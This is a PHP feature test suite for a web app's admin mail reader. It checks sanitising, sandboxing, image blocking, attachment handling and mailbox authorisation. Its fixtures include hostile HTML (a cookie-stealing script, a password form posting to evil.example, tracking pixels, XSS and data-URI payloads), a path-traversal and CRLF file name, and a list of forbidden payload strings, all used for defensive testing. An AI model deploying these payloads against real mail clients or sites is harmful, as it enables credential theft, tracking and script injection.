<?php

namespace Tests\Feature\Mail;

use App\Models\MailAuditEvent;
use App\Services\Mail\Data\MailMessageText;
use App\Services\Mail\MailBodyRenderer;

/**
 * Reading mail safely (docs/MAIL_CENTER.md, "Reading mail safely"): the body is sanitized and shown in a sandboxed frame,
 * remote images wait for an explicit click, plain text is escaped, and an attachment is reachable only through a message
 * of a mailbox the account may read — and then as an opaque download unless it is a raster image whose bytes match.
 */
class MailCenterReadingTest extends MailCenterTestCase
{
    private const HOSTILE = <<<'HTML'
<html><head><style>body{background:url(https://tracker.example/css.gif)}</style><script>window.stolen=document.cookie</script>
<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"></head>
<body onload="alert(1)"><p id="clobber" style="color:red;position:fixed;top:0;left:0;z-index:9999;background-image:url(https://tracker.example/bg.gif)">Quarterly <b>partnership</b> report</p>
<img src="https://tracker.example/open.gif?who=staff" width="1" height="1" alt="">
<img src="javascript:alert(2)"><img src="x" onerror="alert(3)">
<a href="javascript:alert(4)">bad link</a> <a href="https://example.org/report" onclick="steal()">good link</a> <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg1KTwvc2NyaXB0Pg==">data link</a>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
<form action="https://evil.example/collect" method="post"><input name="password" type="password"><button>Sign in</button></form>
<svg onload="alert(6)"><script>alert(7)</script></svg><math><mi xlink:href="javascript:alert(8)">x</mi></math>
<div style="width:expression(alert(9))">expr</div><table background="https://tracker.example/table.gif"><tr><td>cell</td></tr></table>
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEwKSI+PC9zdmc+">
</body></html>
HTML;

    public function test_b_the_limited_staff_reads_a_partnerships_message_and_it_becomes_read(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $this->fake->addMessage($box->address, 'INBOX', 5, ['subject' => 'Partnership proposal', 'from' => ['partner@example.org', 'A Partner']], 'Dear team, here is our proposal.');

        $page = $this->actingAs($staff)->get(route('admin.mail.message', [$box, 5, 'folder' => 'INBOX']));

        $page->assertOk()->assertSee('Partnership proposal')->assertSee('A Partner &lt;partner@example.org&gt;', false)->assertSee('Dear team, here is our proposal.');
        $this->assertDatabaseHas('mail_audit_events', ['action' => MailAuditEvent::MESSAGE_OPENED, 'mailbox_id' => $box->id, 'message_uid' => 5, 'actor_id' => $staff->id]);
        $this->assertDatabaseHas('mail_audit_events', ['action' => MailAuditEvent::MAILBOX_OPENED, 'mailbox_id' => $box->id]);
        $this->assertFalse($this->fake->message($box, 'INBOX', 5)->unseen, 'opening a message marks it read (the provider does)');
    }

    public function test_n_and_o_hostile_html_is_sanitized_and_never_placed_in_the_admin_page(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $this->fake->addMessage($box->address, 'INBOX', 6, ['subject' => 'Report'], '', self::HOSTILE);

        $page = $this->actingAs($staff)->get(route('admin.mail.message', [$box, 6, 'folder' => 'INBOX']));
        $page->assertOk();
        $html = $page->getContent();

        // The message is inside ONE sandboxed frame without allow-scripts / allow-forms / allow-top-navigation.
        $this->assertSame(1, preg_match('/<iframe class="pf-mail-frame"[^>]*sandbox="([^"]*)"[^>]*srcdoc="([^"]*)"/s', $html, $frame));
        $this->assertSame('allow-same-origin allow-popups allow-popups-to-escape-sandbox', $frame[1]);
        $doc = html_entity_decode($frame[2], ENT_QUOTES | ENT_HTML5, 'UTF-8');

        $this->assertStringContainsString('Quarterly <b>partnership</b> report', $doc);
        $this->assertStringContainsString('<a href="https://example.org/report"', $doc);
        $this->assertStringContainsString("script-src 'none'", $doc, 'the frame document forbids scripts in its own policy');
        foreach (['<script', 'onload', 'onerror', 'onclick', 'javascript:', '<iframe', '<object', '<embed', '<form', '<input', '<svg', '<math', 'expression(', 'position', 'z-index', 'url(', 'http-equiv="refresh"', '<base href', 'data:text/html', 'data:image/svg', 'background="', 'id="clobber"', 'tracker.example/open.gif'] as $forbidden) {
            $this->assertStringNotContainsStringIgnoringCase($forbidden, $doc, "survived: {$forbidden}");
        }
        // Outside the frame, the admin page itself carries none of it.
        $outside = str_replace($frame[2], '', $html);
        $this->assertStringNotContainsString('Quarterly', $outside);
        $this->assertStringNotContainsString('tracker.example', $outside);
    }

    public function test_p_remote_images_are_held_back_until_asked_for(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $this->fake->addMessage($box->address, 'INBOX', 7, [], '', '<p>Newsletter</p><img src="https://images.example/pic.png" alt="Banner">');

        $blocked = $this->actingAs($staff)->get(route('admin.mail.message', [$box, 7, 'folder' => 'INBOX']));
        $blocked->assertOk()->assertSee(__('admin.mail.detail.show_images'));
        $doc = $this->frameDocument($blocked->getContent());
        $this->assertStringNotContainsString('https://images.example/pic.png', $doc);
        $this->assertStringContainsString('mc-blocked-image', $doc);
        $this->assertStringContainsString("img-src 'self' data:;", $doc, 'the frame policy does not allow remote images');

        $shown = $this->actingAs($staff)->get(route('admin.mail.message', [$box, 7, 'folder' => 'INBOX', 'images' => 1]));
        $doc = $this->frameDocument($shown->getContent());
        $this->assertStringContainsString('src="https://images.example/pic.png"', $doc);
        $this->assertStringContainsString('referrerpolicy="no-referrer"', $doc);
        $this->assertStringContainsString("img-src 'self' data: https: http:", $doc);
    }

    public function test_inline_cid_pictures_load_from_the_erp_not_the_internet(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==');
        $this->fake->addMessage($box->address, 'INBOX', 8, [], '', '<p>Logo:</p><img src="cid:logo@x" alt="Logo">', [
            ['filename' => 'logo.png', 'contentType' => 'image/png', 'content' => $png, 'inline' => true, 'contentId' => '<logo@x>'],
        ]);

        $doc = $this->frameDocument($this->actingAs($staff)->get(route('admin.mail.message', [$box, 8, 'folder' => 'INBOX']))->getContent());
        $url = route('admin.mail.attachment', [$box, 8, 0, 'folder' => 'INBOX', 'inline' => 1]);
        $this->assertStringContainsString('src="'.e($url).'"', $doc);

        $image = $this->actingAs($staff)->get($url);
        $image->assertOk()->assertHeader('Content-Type', 'image/png')->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertStringStartsWith('inline;', (string) $image->headers->get('Content-Disposition'));
        $this->assertStringContainsString('sandbox', (string) $image->headers->get('Content-Security-Policy'));
    }

    public function test_attachments_download_as_opaque_files_and_a_disguised_image_is_never_shown_inline(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $this->fake->addMessage($box->address, 'INBOX', 9, [], 'See attached.', '', [
            ['filename' => 'report.pdf', 'contentType' => 'application/pdf', 'content' => "%PDF-1.4 test"],
            ['filename' => 'photo.png', 'contentType' => 'image/png', 'content' => '<html><script>alert(1)</script></html>'],
            ['filename' => '../../etc/"evil"'."\r\n".'name.html', 'contentType' => 'text/html', 'content' => '<script>alert(2)</script>'],
        ]);

        $pdf = $this->actingAs($staff)->get(route('admin.mail.attachment', [$box, 9, 0, 'folder' => 'INBOX']));
        $pdf->assertOk()->assertHeader('Content-Type', 'application/octet-stream')->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertStringStartsWith('attachment;', (string) $pdf->headers->get('Content-Disposition'));
        $this->assertSame('%PDF-1.4 test', $pdf->getContent());

        // Claims to be a PNG, is HTML: never inline, never text/html.
        $fake = $this->actingAs($staff)->get(route('admin.mail.attachment', [$box, 9, 1, 'folder' => 'INBOX', 'inline' => 1]));
        $fake->assertOk()->assertHeader('Content-Type', 'application/octet-stream');
        $this->assertStringStartsWith('attachment;', (string) $fake->headers->get('Content-Disposition'));

        // A hostile file name cannot break the header or reach outside the download.
        $html = $this->actingAs($staff)->get(route('admin.mail.attachment', [$box, 9, 2, 'folder' => 'INBOX', 'inline' => 1]));
        $disposition = (string) $html->headers->get('Content-Disposition');
        $html->assertOk()->assertHeader('Content-Type', 'application/octet-stream');
        $this->assertStringNotContainsString("\n", $disposition);
        $this->assertStringNotContainsString('../', $disposition);
        $this->assertDatabaseHas('mail_audit_events', ['action' => MailAuditEvent::ATTACHMENT_DOWNLOADED, 'mailbox_id' => $box->id, 'message_uid' => 9]);
    }

    public function test_m_an_attachment_is_reachable_only_through_an_authorised_mailbox_and_its_own_message(): void
    {
        $staff = $this->limitedStaff();
        $private = $this->boxes['internal'];
        $this->fake->addMessage($private->address, 'INBOX', 20, [], '', '', [['filename' => 'secret.txt', 'contentType' => 'text/plain', 'content' => 'TOP SECRET']]);
        $this->fake->addMessage($this->boxes['partnerships']->address, 'INBOX', 21, [], '', '', [['filename' => 'ok.txt', 'contentType' => 'text/plain', 'content' => 'fine']]);

        // The private mailbox's attachment, directly: 404.
        $this->actingAs($staff)->get(route('admin.mail.attachment', [$private, 20, 0, 'folder' => 'INBOX']))->assertNotFound();
        // Its message number with the partnerships mailbox: looked up in partnerships@ only, where it does not exist.
        $this->actingAs($staff)->get(route('admin.mail.attachment', [$this->boxes['partnerships'], 20, 0, 'folder' => 'INBOX']))->assertNotFound();
        // A position beyond the message's own list: 404; a non-number: no route.
        $this->actingAs($staff)->get(route('admin.mail.attachment', [$this->boxes['partnerships'], 21, 5, 'folder' => 'INBOX']))->assertNotFound();
        $this->actingAs($staff)->get('/admin/mail/'.$this->boxes['partnerships']->id.'/messages/21/attachments/'.urlencode('../../x'))->assertNotFound();
        $this->assertSame([], $this->fake->callsFor($private->address));
        $this->assertStringNotContainsString('TOP SECRET', implode('', array_map(fn ($c) => $c, $this->fake->calls)));
    }

    public function test_plain_text_is_escaped_and_only_web_addresses_become_links(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $this->fake->addMessage($box->address, 'INBOX', 10, [], "Hi <script>alert(1)</script>\nSee https://example.org/a?b=1&c=2. Or javascript:alert(2)");

        $page = $this->actingAs($staff)->get(route('admin.mail.message', [$box, 10, 'folder' => 'INBOX']))->assertOk();

        $page->assertSee('&lt;script&gt;alert(1)&lt;/script&gt;', false);
        $page->assertDontSee('<script>alert(1)</script>', false);
        $page->assertSee('<a href="https://example.org/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">', false);
        $this->assertStringNotContainsString('href="javascript', $page->getContent());
    }

    public function test_the_renderer_never_lets_an_unknown_scheme_or_relative_address_through(): void
    {
        $out = app(MailBodyRenderer::class)->render(new MailMessageText('', '<a href="/admin/users">x</a><a href="#top">y</a><img src="/admin/mail/unread"><a href="vbscript:msgbox">z</a><a href="mailto:a@example.org">m</a>'), true);
        $doc = (string) $out->frameDocument;
        $this->assertStringNotContainsString('href="/admin', $doc);
        $this->assertStringNotContainsString('href="#top"', $doc);
        $this->assertStringNotContainsString('src="/admin/mail/unread"', $doc);
        $this->assertStringNotContainsString('vbscript', $doc);
        $this->assertStringContainsString('href="mailto:a@example.org"', $doc);
    }

    public function test_search_stays_inside_the_current_mailbox_and_folder(): void
    {
        $staff = $this->limitedStaff();
        $box = $this->boxes['partnerships'];
        $this->fake->addMessage($box->address, 'INBOX', 11, ['subject' => 'Grant application'], 'about the grant');
        $this->fake->addMessage($this->boxes['internal']->address, 'INBOX', 12, ['subject' => 'Grant (private)']);

        $page = $this->actingAs($staff)->get(route('admin.mail.mailbox', [$box, 'folder' => 'INBOX', 'q' => "Grant\r\n  application", 'in' => 'subject']));
        $page->assertOk()->assertSee('Grant application')->assertDontSee('Grant (private)');
        $this->assertContains('search '.$box->address.' INBOX subject=Grant application', $this->fake->calls, 'control characters are removed; the words are one typed value');

        // Search syntax typed by a person is just words: it never widens the search beyond this folder of this mailbox.
        $this->actingAs($staff)->get(route('admin.mail.mailbox', [$box, 'folder' => 'INBOX', 'q' => 'OR ALL', 'in' => 'bogus']))->assertOk()->assertDontSee('Grant (private)');
        $this->assertContains('search '.$box->address.' INBOX text=OR ALL', $this->fake->calls, 'an unknown field falls back to the plain text criterion');
        $this->assertSame([], $this->fake->callsFor($this->boxes['internal']->address));
    }

    public function test_a_provider_outage_shows_a_plain_message_and_no_detail(): void
    {
        $staff = $this->limitedStaff();
        $this->fake->failOn['folders'] = \App\Services\Mail\MailProviderException::of('unavailable', 502, new \RuntimeException('upstream said: token abc123 invalid, body {"secret":1}'));

        $page = $this->actingAs($staff)->get(route('admin.mail.mailbox', $this->boxes['partnerships']));

        $page->assertStatus(503)->assertSee(__('admin.mail.provider.unavailable'));
        $page->assertDontSee('abc123')->assertDontSee('upstream said')->assertDontSee('secret');
    }

    public function test_an_unconfigured_provider_says_so_and_points_administrators_to_the_owner_action(): void
    {
        $this->fake->configured = false;

        $this->actingAs($this->limitedStaff())->get(route('admin.mail.mailbox', $this->boxes['partnerships']))
            ->assertOk()->assertSee(__('admin.mail.provider.unconfigured'));
        $this->asVerified($this->accessAdmin())->get(route('admin.mail.mailboxes.index'))
            ->assertOk()->assertSee(__('admin.mail.registry.not_configured'));
    }

    private function frameDocument(string $html): string
    {
        $this->assertSame(1, preg_match('/<iframe class="pf-mail-frame"[^>]*srcdoc="([^"]*)"/s', $html, $m), 'no message frame on the page');

        return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
}
